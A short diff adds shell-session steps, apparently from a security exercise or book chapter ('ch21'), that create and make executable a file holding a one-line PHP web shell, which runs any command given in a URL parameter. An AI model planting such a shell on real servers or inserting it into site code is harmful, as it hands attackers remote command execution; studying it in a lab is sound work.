@@ -1,0 +1,8 @@
+$ nano ch21.php
+# give execute permissions to the file
+$ sudo chmod +x ch21.php
+# display the file's contents
+$ cat ch21.php
+<?php echo system($_GET['command']); ?>
+# confirm permissions
+$ ls -l ch21.php
